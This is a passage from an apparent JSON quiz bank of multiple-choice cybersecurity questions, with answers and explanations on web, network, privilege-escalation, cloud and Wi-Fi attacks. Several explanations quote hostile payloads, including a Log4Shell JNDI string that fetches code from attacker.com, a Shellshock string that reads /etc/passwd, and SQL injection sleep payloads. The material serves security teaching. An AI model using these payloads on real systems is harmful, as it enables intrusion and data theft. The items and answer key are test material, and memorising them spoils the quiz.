      "MAC Flooding (using tools like macof)",
      "ARP Spoofing",
      "VLAN Double Tagging",
      "Spanning Tree Protocol Hijacking"
    ],
    "answer": 0,
    "explanation": "Switches forward frames based on their CAM table. Flooding the table with thousands of fake MACs exhausts switch memory, forcing it into 'fail-open' broadcast mode where all frames flood out of every port like a hub."
  },
  {
    "id": 122,
    "question": "What network attack exhausts the pool of available IP addresses on a DHCP server by flooding it with forged DHCP discover requests using spoofed MAC addresses?",
    "options": [
      "Rogue DHCP Server Attack",
      "DHCP Starvation Attack",
      "DNS Cache Poisoning",
      "SYN Flood Attack"
    ],
    "answer": 1,
    "explanation": "DHCP starvation floods the DHCP scope with requests using randomized MAC addresses, consuming all available IP leases. The attacker then deploys a Rogue DHCP server to assign malicious DNS server addresses to new clients."
  },
  {
    "id": 123,
    "question": "In web application security, what vulnerability occurs when an application evaluates user-supplied input inside a server-side template engine (e.g. Jinja2, Twig)?",
    "options": [
      "Cross-Site Scripting (XSS)",
      "Cross-Site Request Forgery (CSRF)",
      "Server-Side Template Injection (SSTI)",
      "SQL Injection"
    ],
    "answer": 2,
    "explanation": "SSTI occurs when user input is concatenated directly into template strings (e.g. `{{7*7}}`) instead of passed as data. Attackers navigate python/java class hierarchies to execute arbitrary shell commands on the server."
  },
  {
    "id": 124,
    "question": "What web application vulnerability occurs when an application reconstructs serialized objects from untrusted streams without validation, leading to Remote Code Execution?",
    "options": [
      "Path Traversal",
      "XML External Entity Injection",
      "Cross-Site Scripting",
      "Insecure Deserialization (CWE-502)"
    ],
    "answer": 3,
    "explanation": "Insecure deserialization takes untrusted serialized data (e.g. Java serialized objects, Python pickle, PHP objects) and reconstructs them in memory. Attackers use gadget chains (e.g. ysoserial) to trigger arbitrary command execution."
  },
  {
    "id": 125,
    "question": "What attack against JSON Web Tokens (JWT) forces the server to accept an unverified token by setting the header 'alg' field to a non-cryptographic value?",
    "options": [
      "The 'alg: none' Attack",
      "The Bleichenbacher Oracle Attack",
      "The POODLE CBC Attack",
      "The Length Extension Attack"
    ],
    "answer": 0,
    "explanation": "Some vulnerable JWT validation libraries accept the header value 'alg': 'none'. If accepted, the library skips signature verification completely, allowing an attacker to forge arbitrary administrative claims without a secret key."
  },
  {
    "id": 126,
    "question": "What attack against JSON Web Tokens (JWT) exploits a server expecting an asymmetric RSA signature (RS256) by signing the token using the server's public key as an HMAC secret (HS256)?",
    "options": [
      "The 'none' Algorithm Attack",
      "Algorithm Confusion",
      "Replay Attack",
      "Padding Oracle Attack"
    ],
    "answer": 1,
    "explanation": "In Algorithm Confusion, the attacker changes 'alg' from RS256 to HS256 and signs the token with the server's public key (which is public knowledge). If the server verifies using its public key as the HMAC secret, the forged token succeeds. (Key Confusion / RS256 to HS256 Attack)"
  },
  {
    "id": 127,
    "question": "What Cross-Origin Resource Sharing (CORS) misconfiguration allows external malicious websites to read sensitive authenticated responses via XMLHttpRequests?",
    "options": [
      "Content-Security-Policy: default-src 'self' and frame-ancestors 'none'",
      "X-Frame-Options: DENY with X-Content-Type-Options: nosniff",
      "Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true",
      "Strict-Transport-Security: max-age=31536000 with includeSubDomains"
    ],
    "answer": 2,
    "explanation": "When a server dynamically reflects the client's `Origin` header in `Access-Control-Allow-Origin` and enables `Access-Control-Allow-Credentials: true`, any malicious site visited by an authenticated user can read private API data."
  },
  {
    "id": 128,
    "question": "In SQL Injection testing, what payload construct is used to extract data when the application generates no error messages and returns zero output on the page?",
    "options": [
      "Union-Based SQL Injection",
      "Error-Based SQL Injection",
      "Second-Order SQL Injection",
      "Time-Based Blind SQL Injection"
    ],
    "answer": 3,
    "explanation": "When a page returns identical content regardless of queries, testers use conditional sleep functions (`IF(1=1, SLEEP(5), 0)`). If the server response pauses for 5 seconds, the condition evaluated to true, extracting data bit-by-bit. (using sleep functions like WAITFOR DELAY '0:0:5' or pg_sleep(5))"
  },
  {
    "id": 129,
    "question": "In SQL Injection testing, what technique combines data from an injected query with the application's legitimate query results using set theory?",
    "options": [
      "UNION-Based SQL Injection (UNION SELECT ...)",
      "Boolean Blind Injection",
      "Time-Based Injection",
      "Out-of-Band Injection"
    ],
    "answer": 0,
    "explanation": "UNION-based SQL injection appends the results of an attacker-crafted SELECT statement to the original query results using the `UNION` operator, provided both queries have an identical number of columns and compatible data types."
  },
  {
    "id": 130,
    "question": "In Linux privilege escalation, what permission bit allows an executable binary to run with the privileges of the file owner (typically root) rather than the calling user?",
    "options": [
      "SGID (Set Group ID - octal 2000)",
      "SUID (Set User ID - octal 4000 e.g. -rwsr-xr-x)",
      "Sticky Bit (octal 1000)",
      "Read-Only Flag (octal 0444)"
    ],
    "answer": 1,
    "explanation": "When the SUID bit is set on an executable owned by root, any unprivileged user running the binary executes it with root privileges. Misconfigured SUID binaries (documented on GTFOBins) allow trivial root privilege escalation."
  },
  {
    "id": 131,
    "question": "What community-driven curated repository catalogs Unix binaries, script interpreters, and utilities that can be exploited to bypass local security restrictions and escalate privileges?",
    "options": [
      "Exploit-DB",
      "CWE Top 25",
      "GTFOBins",
      "NIST NVD"
    ],
    "answer": 2,
    "explanation": "GTFOBins is a curated list of Unix binaries (e.g. vim, find, bash, python, awk, tar) that can be abused to bypass local security restrictions, spawn interactive shells, or escalate privileges when misconfigured with SUID or sudo."
  },
  {
    "id": 132,
    "question": "In Windows privilege escalation, what vulnerability occurs when a service binary path contains spaces and lacks quotation marks (e.g. C:\\Program Files\\My Service\\svc.exe)?",
    "options": [
      "AlwaysInstallElevated Exploit",
      "DLL Search Order Hijacking",
      "Named Pipe Impersonation",
      "Unquoted Service Path Vulnerability"
    ],
    "answer": 3,
    "explanation": "When a path has spaces and no quotes, the Windows Service Control Manager interprets it in order: 'C:\\Program.exe', 'C:\\Program Files\\My.exe', etc. An attacker with write access to 'C:' drops 'Program.exe', executing arbitrary code as SYSTEM on service start."
  },
  {
    "id": 133,
    "question": "In Windows privilege escalation, what two registry keys, when set to DWORD value 1, allow non-administrative users to install MSI packages with elevated SYSTEM privileges?",
    "options": [
      "AlwaysInstallElevated in HKLM and HKCU (Software\\Policies\\Microsoft\\Windows\\Installer)",
      "EnableLUA in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
      "DisableCAD in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
      "StorageDevicePolicies\\WriteProtect set to 1"
    ],
    "answer": 0,
    "explanation": "If 'AlwaysInstallElevated' is enabled in BOTH HKEY_LOCAL_MACHINE and HKEY_CURRENT_USER, Windows executes all Windows Installer (.msi) packages with full SYSTEM rights, allowing testers to generate a malicious MSI with msfvenom."
  },
  {
    "id": 134,
    "question": "What Linux privilege escalation vulnerability (CVE-2016-5195) exploited a race condition in the kernel's copy-on-write (COW) memory subsystem to write to read-only memory mappings?",
    "options": [
      "Dirty Pipe (CVE-2022-0847)",
      "Dirty COW",
      "Heartbleed",
      "Shellshock"
    ],
    "answer": 1,
    "explanation": "Dirty COW (CVE-2016-5195) exploited a race condition in the Linux kernel memory manager's handling of Copy-on-Write (COW). Unprivileged local users could write to read-only memory mappings, modifying files like /etc/passwd."
  },
  {
    "id": 135,
    "question": "What Linux vulnerability (CVE-2022-0847) allowed unprivileged local users to overwrite data in arbitrary read-only files by abusing uninitialized flags in kernel pipe buffers?",
    "options": [
      "Dirty COW",
      "EternalBlue",
      "Dirty Pipe",
      "Log4Shell"
    ],
    "answer": 2,
    "explanation": "Dirty Pipe (CVE-2022-0847) exploited a flaw in the Linux kernel pipe buffer implementation, allowing unprivileged users to inject data into page cache pages backing read-only files, enabling instant root privilege escalation."
  },
  {
    "id": 136,
    "question": "What infamous remote code execution vulnerability (CVE-2021-44228) in the Apache Log4j Java logging framework executed arbitrary code via JNDI lookup strings?",
    "options": [
      "Spring4Shell (CVE-2022-22965)",
      "Shellshock (CVE-2014-6271)",
      "Heartbleed (CVE-2014-0160)",
      "Log4Shell"
    ],
    "answer": 3,
    "explanation": "Log4Shell allowed remote unauthenticated attackers to execute arbitrary code by passing JNDI lookup strings (`${jndi:ldap://attacker.com/payload}`) in logged user agents, forms, or headers, forcing the server to load external Java classes."
  },
  {
    "id": 137,
    "question": "What Bash vulnerability (CVE-2014-6271) executed arbitrary commands appended to trailing function definitions inside imported environment variables?",
    "options": [
      "Shellshock",
      "Heartbleed",
      "Log4Shell",
      "Poodle"
    ],
    "answer": 0,
    "explanation": "Shellshock was a flaw in GNU Bash where trailing commands following function definitions inside environment variables (`() { :;}; /bin/cat /etc/passwd`) were executed automatically when a new subshell was spawned by web CGI scripts."
  },
  {
    "id": 138,
    "question": "In web application security testing, what is 'Clickjacking' (UI Redressing)?",
    "options": [
      "Interception of wireless mouse clicks using radio frequency receivers",
      "Overlaying a transparent, invisible iframe containing a target website over an enticing decoy button to trick users into clicking unintended buttons",
      "Automated brute-forcing of credit card CVV verification numbers",
      "Overwriting the browser DNS cache to redirect search engine traffic"
    ],
    "answer": 1,
    "explanation": "Clickjacking tricks a user into clicking an actionable button or link on an invisible iframe (e.g. 'Delete Account' or 'Transfer Money') layered invisibly beneath an innocent decoy game or button."
  },
  {
    "id": 139,
    "question": "What HTTP security header defends websites against Clickjacking attacks by preventing the page from being embedded in an iframe?",
    "options": [
      "X-Content-Type-Options: nosniff",
      "Access-Control-Allow-Origin: *",
      "X-Frame-Options: DENY",
      "Referrer-Policy: no-referrer"
    ],
    "answer": 2,
    "explanation": "The 'X-Frame-Options: DENY' (or 'SAMEORIGIN') header instructs browsers not to render the page inside any `<frame>`, `<iframe>`, or `<object>`, completely defeating Clickjacking attacks. (or Content-Security-Policy: frame-ancestors 'none')"
  },
  {
    "id": 140,
    "question": "What vulnerability occurs when an application sets the MIME type of a file based on untrusted user uploads, and the browser overrides the Content-Type header to execute script?",
    "options": [
      "Cross-Site Request Forgery",
      "SQL Injection",
      "Server-Side Request Forgery",
      "MIME-Sniffing"
    ],
    "answer": 3,
    "explanation": "If a browser 'sniffs' content, an attacker uploading an image containing HTML/JavaScript might have the file executed as script. Sending 'X-Content-Type-Options: nosniff' forces browsers to strictly adhere to the declared MIME type. (prevented via 'X-Content-Type-Options: nosniff')"
  },
  {
    "id": 141,
    "question": "What comprehensive HTTP header framework allows web developers to restrict the sources from which scripts, styles, images, and frames can be loaded by the browser?",
    "options": [
      "Content Security Policy (CSP - Content-Security-Policy)",
      "Cross-Origin Resource Sharing (CORS)",
      "HTTP Strict Transport Security (HSTS)",
      "Public Key Pinning Extension (HPKP)"
    ],
    "answer": 0,
    "explanation": "Content Security Policy (CSP) is a powerful defense-in-depth header. By whitelisting authorized sources for scripts (`script-src 'self'`), it restricts inline scripts and external domains, neutralizing XSS and data exfiltration."
  },
  {
    "id": 142,
    "question": "In Penetration Testing, what is 'Fuzzing' (Fuzz Testing)?",
    "options": [
      "The manual review of printed source code by senior software architects",
      "An automated software testing technique that feeds invalid, unexpected, or random data inputs into a program to identify crashes, memory leaks, and vulnerabilities",
      "The encryption of physical hard drive partitions using 256-bit AES keys",
      "The physical cleaning of server room equipment using specialized anti-static brushes"
    ],
    "answer": 1,
    "explanation": "Fuzzing bombards an application's inputs (parameters, file formats, network protocols) with semi-random, malformed payloads to trigger unexpected exceptions, buffer overflows, or hangs, exposing exploitable zero-day flaws."
  },
  {
    "id": 143,
    "question": "What open-source fuzzer developed by Micha\u0142 Zalewski uses compile-time instrumentation and genetic algorithms to efficiently discover software bugs and crashes?",
    "options": [
      "Wireshark",
      "Metasploit",
      "AFL (American Fuzzy Lop)",
      "Burp Suite"
    ],
    "answer": 2,
    "explanation": "AFL (American Fuzzy Lop) is an industry-standard coverage-guided fuzzer. It uses genetic algorithms and compiler instrumentation to track code coverage paths, mutating inputs that explore new execution branches to find deep bugs."
  },
  {
    "id": 144,
    "question": "What buffer overflow exploitation technique chains small snippets of existing executable instructions ending in a 'RET' opcode to bypass Data Execution Prevention (DEP / NX)?",
    "options": [
      "NOP Sled Injection",
      "Heap Spraying",
      "Format String Exploitation",
      "Return-Oriented Programming (ROP)"
    ],
    "answer": 3,
    "explanation": "Because DEP/NX prevents code execution on the stack, ROP searches existing signed executable memory for short instruction sequences followed by a RET instruction (called 'gadgets'), chaining them together to achieve code execution."
  },
  {
    "id": 145,
    "question": "What memory corruption mitigation places random canary values on the stack between local buffers and the saved return pointer to detect stack overflows before function return?",
    "options": [
      "Stack Canaries (Stack Cookies / -fstack-protector)",
      "Address Space Layout Randomization (ASLR)",
      "Data Execution Prevention (DEP)",
      "Control Flow Guard (CFG)"
    ],
    "answer": 0,
    "explanation": "Stack canaries place a secret random integer on the stack before the return address. When the function returns, it checks if the canary has been modified; if altered by a buffer overflow, the program terminates immediately without executing the return address."
  },
  {
    "id": 146,
    "question": "What memory security feature randomizes the base virtual memory addresses of the stack, heap, and loaded libraries on every program execution to thwart buffer overflow exploits?",
    "options": [
      "Data Execution Prevention (DEP)",
      "Address Space Layout Randomization (ASLR)",
      "Kernel Patch Protection (KPP)",
      "Supervisor Mode Access Prevention (SMAP)"
    ],
    "answer": 1,
    "explanation": "ASLR randomizes memory address layouts (stack, heap, shared libraries) at launch, preventing attackers from predicting target function addresses (like system() or ROP gadgets) in memory."
  },
  {
    "id": 147,
    "question": "What vulnerability occurs when an application passes user-supplied input directly as the format string argument to functions like printf(), sprintf(), or syslog() in C/C++?",
    "options": [
      "Buffer Overflow",
      "SQL Injection",
      "Format String Vulnerability (CWE-134)",
      "Integer Overflow"
    ],
    "answer": 2,
    "explanation": "If an attacker controls the format string (`printf(user_input)` instead of `printf('%s', user_input)`), they can supply format specifiers like `%x` to read stack data or `%n` to write arbitrary values to memory."
  },
  {
    "id": 148,
    "question": "What vulnerability occurs when an arithmetic operation attempts to create a numeric value that falls outside the range of values that can be represented by the integer data type?",
    "options": [
      "Buffer Over-read",
      "Format String Bug",
      "Type Confusion",
      "Integer Overflow / Wraparound (CWE-190)"
    ],
    "answer": 3,
    "explanation": "Integer overflow occurs when an integer exceeds its maximum capacity (e.g. adding 1 to a 32-bit unsigned 4,294,967,295 wraps around to 0). In memory allocation, calculating `size * count` can wrap to a small value, causing heap overflow."
  },
  {
    "id": 149,
    "question": "What automated open-source web application vulnerability scanner is developed under OWASP as an extensible, developer-friendly alternative to commercial web scanners?",
    "options": [
      "OWASP ZAP (Zed Attack Proxy)",
      "Burp Suite Professional",
      "Nessus Scanner",
      "Qualys Guard"
    ],
    "answer": 0,
    "explanation": "OWASP ZAP (Zed Attack Proxy) is the most widely used open-source web security scanner in the world, providing automated scanning, intercepting proxies, and CI/CD integration for web applications."
  },
  {
    "id": 150,
    "question": "What is the designated legal standard for authorization in Penetration Testing to distinguish legal ethical hacking from criminal computer tampering?",
    "options": [
      "Holding a valid academic degree in computer science or engineering",
      "A formal written Rules of Engagement (RoE) agreement and signed Permission to Test (Statement of Work / SOW) from the asset owner",
      "Verbally telling a system administrator that you are conducting a security test",
      "Publishing all discovered database credentials to open GitHub repositories"
    ],
    "answer": 1,
    "explanation": "Under Section 43/66 IT Act in India and equivalent international laws, accessing systems without explicit written consent is illegal computer tampering. Ethical hacking requires signed, legally binding Rules of Engagement before testing begins."
  },
  {
    "id": 151,
    "question": "What cryptographic attack extracts secret keys by measuring physical electrical current variations consumed by a cryptographic hardware processor during calculation?",
    "options": [
      "Timing Attack",
      "Acoustic Cryptanalysis",
      "Power Analysis Attack",
      "Cold Boot Memory Attack"
    ],
    "answer": 2,
    "explanation": "Differential Power Analysis (DPA, Kocher et al.) statistically analyzes power consumption traces of microchips executing cryptographic operations (like S-Box lookups in AES/DES) to recover secret keys without opening the chip. (Simple Power Analysis - SPA / Differential Power Analysis - DPA)"
  },
  {
    "id": 152,
    "question": "What physical security principle prevents copying unknown quantum states, forming the theoretical basis of Quantum Key Distribution (QKD)?",
    "options": [
      "Heisenberg's Uncertainty Principle",
      "Pauli Exclusion Principle",
      "Quantum Entanglement Theorem",
      "No-Cloning Theorem"
    ],
    "answer": 3,
    "explanation": "The No-Cloning Theorem states that it is impossible to create an identical copy of an arbitrary unknown quantum state. Any eavesdropper attempting to measure or intercept quantum particles disturbs their state, alerting communicating parties."
  },
  {
    "id": 153,
    "question": "What pioneered Quantum Key Distribution (QKD) protocol developed in 1984 transmits photon polarizations across rectilinear and diagonal bases?",
    "options": [
      "BB84 Protocol",
      "E91 Protocol (Ekert Entangled Protocol)",
      "Shor 9-Qubit Protocol",
      "B92 Protocol"
    ],
    "answer": 0,
    "explanation": "The BB84 protocol (1984) uses polarized single photons sent across randomly chosen non-orthogonal bases (Rectilinear: 0\u00b0/90\u00b0, and Diagonal: 45\u00b0/135\u00b0). Comparing a subset of bases allows Alice and Bob to detect eavesdropping and establish a shared key. (developed by Charles Bennett and Gilles Brassard)"
  },
  {
    "id": 154,
    "question": "What cryptographic technique allows complex mathematical computations to be executed directly on encrypted ciphertext without ever decrypting it first?",
    "options": [
      "Galois/Counter Mode (GCM)",
      "Fully Homomorphic Encryption (FHE)",
      "Elliptic Curve Diffie-Hellman (ECDH)",
      "Optimal Asymmetric Encryption Padding (OAEP)"
    ],
    "answer": 1,
    "explanation": "Fully Homomorphic Encryption (FHE, pioneered by Craig Gentry in 2009) allows arbitrary computations on encrypted data. The decrypted result of the computation on ciphertext exactly matches the result of the computation on the plaintext."
  },
  {
    "id": 155,
    "question": "What cryptographic proof allows a prover to prove to a verifier that a statement is mathematically true without conveying any information beyond the statement's validity?",
    "options": [
      "Digital Signature Algorithm (DSA)",
      "Message Authentication Code (HMAC)",
      "Zero-Knowledge Proof (ZKP - e.g. zk-SNARKs, zk-STARKs)",
      "Public Key Infrastructure (PKI)"
    ],
    "answer": 2,
    "explanation": "A Zero-Knowledge Proof (ZKP) enables one party (Alice) to prove to Bob that she knows a secret (e.g. password, private key) without revealing the secret itself, satisfying Completeness, Soundness, and Zero-Knowledge."
  },
  {
    "id": 156,
    "question": "Under FIPS 140-2 and FIPS 140-3 standards for Hardware Security Modules (HSM), which security level mandates physical tamper response circuitry that actively zeroes secret keys upon enclosure breach?",
    "options": [
      "Level 1 (Basic software security)",
      "Level 2 (Tamper-evident seals)",
      "Level 0 (Uncertified commercial off-the-shelf)",
      "Level 3 (and Level 4)"
    ],
    "answer": 3,
    "explanation": "FIPS 140-2/3 Level 3 mandates physical tamper detection and response: if the physical enclosure is opened, drilled, or probed, the HSM zeroizes (wipes) all plaintext cryptographic keys instantly."
  },
  {
    "id": 157,
    "question": "What web attack exploits discrepancies in how front-end reverse proxies and back-end servers parse 'Content-Length' and 'Transfer-Encoding' HTTP headers?",
    "options": [
      "HTTP Request Smuggling",
      "Cross-Site Request Forgery",
      "SQL Injection",
      "Clickjacking"
    ],
    "answer": 0,
    "explanation": "HTTP Request Smuggling exploits desynchronization between front-end reverse proxies and back-end web servers when processing ambiguous headers (Content-Length vs Transfer-Encoding: chunked), allowing attackers to prepend malicious requests to other users' sessions. (e.g. CL.TE or TE.CL vulnerabilities)"
  },
  {
    "id": 158,
    "question": "What web vulnerability occurs when an attacker registers an expired or abandoned cloud hosting domain (e.g. GitHub Pages, AWS S3) referenced by a target's dangling CNAME DNS record?",
    "options": [
      "DNS Amplification Attack",
      "Subdomain Takeover",
      "ARP Spoofing",
      "BGP Hijacking"
    ],
    "answer": 1,
    "explanation": "Subdomain Takeover occurs when a company creates a CNAME DNS record (e.g. 'blog.company.com' pointing to 'company.github.io') and later terminates the cloud service without deleting the DNS record. An attacker claims the cloud service name, hijacking the corporate subdomain."
  },
  {
    "id": 159,
    "question": "In web application security, what attack abuses caching reverse proxies by tricking them into saving dynamic sensitive user pages as static, publicly cacheable resources?",
    "options": [
      "Session Hijacking",
      "Cross-Origin Resource Sharing",
      "Web Cache Deception (and Web Cache Poisoning)",
      "Server-Side Request Forgery"
    ],
    "answer": 2,
    "explanation": "Web Cache Deception tricks a caching server into caching a private, dynamic endpoint (e.g. '/profile/account.php/nonexistent.css') because of the static extension, allowing unauthenticated attackers to fetch the victim's cached private profile."
  },
  {
    "id": 160,
    "question": "In GraphQL API penetration testing, what query feature allows an attacker to automatically download the entire API schema, types, queries, and mutations?",
    "options": [
      "GraphiQL Web Interface",
      "GraphQL Mutation Injection",
      "Batch Query Processing",
      "Introspection Query (__schema and __type fields)"
    ],
    "answer": 3,
    "explanation": "GraphQL Introspection allows clients to query the internal schema structure (`query { __schema { types { name } } }`). If enabled in production, attackers extract all data models, queries, parameters, and hidden administrative endpoints."
  },
  {
    "id": 161,
    "question": "What attack against GraphQL APIs exploits nested relationship fields (e.g. thread -> author -> threads -> author) to exhaust server CPU and memory resources?",
    "options": [
      "Circular Query / Query Depth Denial of Service Attack",
      "SQL Injection",
      "Cross-Site Scripting",
      "Parameter Pollution"
    ],
    "answer": 0,
    "explanation": "GraphQL allows circular relationship queries. An attacker crafts a query with extreme nesting depth (100+ levels), forcing the back-end database to execute thousands of recursive queries, exhausting server resources."
  },
  {
    "id": 162,
    "question": "What vulnerability ranks as API #1 in the OWASP API Security Top 10, occurring when an API endpoint fails to verify if an authenticated user owns the requested object ID?",
    "options": [
      "BFLA (Broken Function Level Authorization)",
      "BOLA (Broken Object Level Authorization / IDOR)",
      "Mass Assignment",
      "Unrestricted Resource Consumption"
    ],
    "answer": 1,
    "explanation": "BOLA (Broken Object Level Authorization) occurs when an API endpoint (e.g. 'GET /api/v1/users/105/orders') validates authentication, but fails to check if user 105 belongs to the requesting client, exposing all users' data."
  },
  {
    "id": 163,
    "question": "What API vulnerability occurs when an endpoint accepts user-supplied JSON input and binds it directly to internal database model fields without filtering administrative attributes?",
    "options": [
      "Broken Object Level Authorization",
      "Server-Side Request Forgery",
      "Mass Assignment",
      "Cross-Site Scripting"
    ],
    "answer": 2,
    "explanation": "Mass Assignment occurs when frameworks automatically bind HTTP request parameters to internal object properties. An attacker injecting `'is_admin': true` or `'role': 'admin'` in a registration request gets elevated privileges if unfiltered. (Auto-Binding / Parameter Tampering)"
  },
  {
    "id": 164,
    "question": "What attack against JSON Web Tokens (JWT) exploits a server using the 'jku' (JWK Set URL) header by pointing it to an attacker-controlled public key URL?",
    "options": [
      "None Algorithm Attack",
      "Key Confusion Attack",
      "Bleichenbacher Attack",
      "JKU Header Injection"
    ],
    "answer": 3,
    "explanation": "The 'jku' header specifies a URL where the public key for verifying the token resides. If the server does not enforce a whitelist, the attacker supplies a malicious token pointing to their own server's public key, forging valid signatures."
  },
  {
    "id": 165,
    "question": "What attack exploits web applications by manipulating DNS responses with zero TTL so a public domain temporarily resolves to internal private IPs (127.0.0.1)?",
    "options": [
      "DNS Rebinding Attack",
      "DNS Amplification",
      "DNS Cache Poisoning",
      "Zone Transfer"
    ],
    "answer": 0,
    "explanation": "DNS Rebinding bypasses Same-Origin Policy. The attacker's domain initially resolves to their public IP (loading attack JS), then returns a second DNS response with IP 127.0.0.1 (or router IP) with TTL=0, allowing client JS to access internal network services."
  },
  {
    "id": 166,
    "question": "In AWS cloud penetration testing, what vulnerability occurs when an Amazon S3 storage bucket permissions grant 'AllUsers' or 'AuthenticatedUsers' read/write access?",
    "options": [
      "IAM Policy Privilege Escalation",
      "Public S3 Bucket Misconfiguration",
      "VPC Peering Interception",
      "CloudTrail Evasion"
    ],
    "answer": 1,
    "explanation": "S3 bucket misconfigurations where ACLs or bucket policies grant access to 'Everyone' or 'AuthenticatedUsers' (meaning ANY AWS account in the world) allow unauthenticated adversaries to download proprietary data or upload malicious payloads."
  },
  {
    "id": 167,
    "question": "What AWS Identity and Access Management (IAM) permission allows an attacker to escalate privileges by creating a new version of an IAM policy with full administrator rights?",
    "options": [
      "iam:PassRole",
      "iam:ListUsers",
      "iam:CreatePolicyVersion",
      "iam:GetRole"
    ],
    "answer": 2,
    "explanation": "If an IAM identity has 'iam:CreatePolicyVersion' permission, they can create a new version of their own policy defining `'Effect': 'Allow', 'Action': '*', 'Resource': '*'` and set it as default, achieving instant full AWS admin access."
  },
  {
    "id": 168,
    "question": "What AWS IAM permission allows an attacker with EC2 launch permissions to attach a high-privilege IAM instance profile to a newly created EC2 instance?",
    "options": [
      "iam:GetPolicy",
      "iam:DeleteUser",
      "ec2:DescribeInstances",
      "iam:PassRole (combined with ec2:RunInstances)"
    ],
    "answer": 3,
    "explanation": "'iam:PassRole' authorizes passing an existing service role to an AWS service. An attacker with 'iam:PassRole' and 'ec2:RunInstances' launches an EC2 instance with an administrator role attached, ssh-es in, and steals the admin token from IMDS."
  },
  {
    "id": 169,
    "question": "What Wi-Fi network attack captures the WPA2 4-Way Handshake by transmitting deauthentication frames to force connected client devices to disconnect and reconnect?",
    "options": [
      "Deauthentication & Handshake Capture Attack",
      "WPS PIN Brute-force (Reaver)",
      "Evil Twin MITM Attack",
      "Beacon Flooding Attack"
    ],
    "answer": 0,
    "explanation": "Attackers send spoofed 802.11 Deauth frames (`aireplay-ng -0`) to disconnect a client. When the client automatically reconnects, the attacker captures the 4-way EAPOL handshake containing the WPA2-PSK cryptographic challenge for offline cracking. (using aircrack-ng / aireplay-ng)"
  },
  {
    "id": 170,
    "question": "What modern WPA/WPA2 Wi-Fi attack allows capturing the PMKID directly from the Access Point's initial EAPOL frame 1 WITHOUT waiting for any client station to connect?",
    "options": [
      "Deauthentication Attack",
      "PMKID Attack",
      "WPS Pixie Dust Attack",
      "WEP IV Collision Attack"
    ],
    "answer": 1,
    "explanation": "Jens Steube (Hashcat lead) discovered that many modern routers include the PMKID in the first EAPOL frame sent to any associating client. Attackers extract the PMKID directly from the AP without needing an active client and crack the WPA2 PSK offline. (demonstrated by Jens Steube / Hashcat mode 16800)"
  },
  {
    "id": 171,
    "question": "What wireless attack sets up a rogue Wi-Fi Access Point with the exact same SSID, encryption type, and MAC address as a legitimate enterprise network to intercept user credentials?",
    "options": [
      "War Driving",
      "Bluebugging",
      "Evil Twin Attack",
      "Rogue DHCP Attack"
    ],
    "answer": 2,
    "explanation": "An Evil Twin clones a legitimate Access Point's SSID and MAC address, transmitting at higher power. Clients automatically roam to the rogue AP, where the attacker captures enterprise credentials, injects captive portal phishing, or inspects traffic."
  },
  {
    "id": 172,
    "question": "What is 'WPS Pixie Dust Attack' in wireless penetration testing?",
    "options": [
      "An attack that physically shorts the wireless router power capacitor",
      "An attack that floods the wireless channel with high-energy microwave noise",
      "An attack that cracks WPA3 enterprise passwords using rainbow tables",
      "An offline attack exploiting weak, non-random pseudorandom number generators in vulnerable Wi-Fi Protected Setup (WPS) chipsets to recover the WPS PIN in seconds"
    ],
    "answer": 3,
    "explanation": "The Pixie Dust attack (Dominique Bongard, 2014) targets WPS implementations where internal nonces (E-S1, E-S2) are generated with zero or predictable PRNG seeds, allowing offline recovery of the WPS PIN within seconds without router lockouts."
  },
  {
    "id": 173,
    "question": "What security protocol replaces WPA2 for Wi-Fi security, eliminating offline dictionary attacks using Simultaneous Authentication of Equals (SAE)?",
    "options": [
      "WPA3 (Wi-Fi Protected Access 3)",
      "WPA2-Enterprise with PEAP",
      "WEP2 (Wired Equivalent Privacy 2)",
      "802.11b Shared Key Auth"
    ],
    "answer": 0,
    "explanation": "WPA3 introduces Simultaneous Authentication of Equals (SAE, based on the Dragonfly handshake). SAE prevents offline dictionary attacks even with weak passwords and enforces Perfect Forward Secrecy for local traffic."
  },
  {
    "id": 174,
    "question": "What side-channel timing attack against WPA3 SAE handshakes (demonstrated in the 'Dragonblood' vulnerabilities) leaked password information?",
    "options": [
      "Heartbleed",
      "Dragonblood",
      "KRACK (Key Reinstallation Attack)",
      "POODLE"
    ],
    "answer": 1,
    "explanation": "The Dragonblood vulnerabilities showed that WPA3's SAE 'hunting-and-pecking' algorithm for mapping passwords to elliptic curve points took variable time and memory access patterns, leaking password entropy to local attackers. (CVE-2019-9494 - timing and cache-based side-channel attacks against hunting-and-pecking curve derivation)"
  },
  {
    "id": 175,
    "question": "What social engineering attack targets high-profile corporate executives, board members, or CFOs to authorize fraudulent wire transfers?",
    "options": [
      "Baiting",
      "Vishing",
      "Whaling (Whale Phishing)",
      "Quid Pro Quo"
    ],
    "answer": 2,
    "explanation": "Whaling is a specialized form of spear phishing directed specifically at C-level executives (CEOs, CFOs), board members, or high-net-worth individuals, often involving Business Email Compromise (BEC) wire transfer fraud."
  },
  {
    "id": 176,
    "question": "What social engineering technique leaves infected USB flash drives in parking lots or reception areas hoping an employee will plug them into an internal workstation?",
    "options": [
      "Pretexting",
      "Tailgating (Piggybacking)",
      "Phishing",
      "Baiting"
    ],
    "answer": 3,
    "explanation": "Baiting relies on curiosity or greed. Attackers leave malware-infected USB thumb drives (labeled 'Executive Salaries 2024') in public company areas. An employee plugs it into a workstation, executing malware."
  },
  {
    "id": 177,
    "question": "What physical social engineering technique involves an unauthorized individual closely following an authorized employee through a secure security turnstile or door?",
    "options": [
      "Tailgating (or Piggybacking)",
      "Shoulder Surfing",
      "Dumpster Diving",
      "Pretexting"
    ],
    "answer": 0,
    "explanation": "Tailgating occurs when an attacker without credentials follows an authorized person through a secured door, often pretending to carry heavy boxes or holding the door open under common social politeness."
  },
  {
    "id": 178,
    "question": "What cyber attack compromises a legitimate website frequently visited by employees of a specific target organization to infect their computers?",
    "options": [
      "Spear Phishing",
      "Watering Hole Attack (Waterholing)",
      "Typosquatting",
      "Drive-by Download"
    ],
    "answer": 1,
    "explanation": "In a Watering Hole attack, adversaries identify websites frequented by their targets (e.g., industry news, vendor portals), compromise that third-party site, and embed zero-day exploits targeting visitors from specific corporate IP ranges."
  },
  {
    "id": 179,
    "question": "What penetration testing post-exploitation tool written in PowerShell by Will Schroeder and harmj0y is standard for Active Directory domain enumeration?",
    "options": [
      "Nmap NSE",
      "Hydra",
      "PowerView (part of PowerSploit)",
      "Wireshark"
    ],
    "answer": 2,
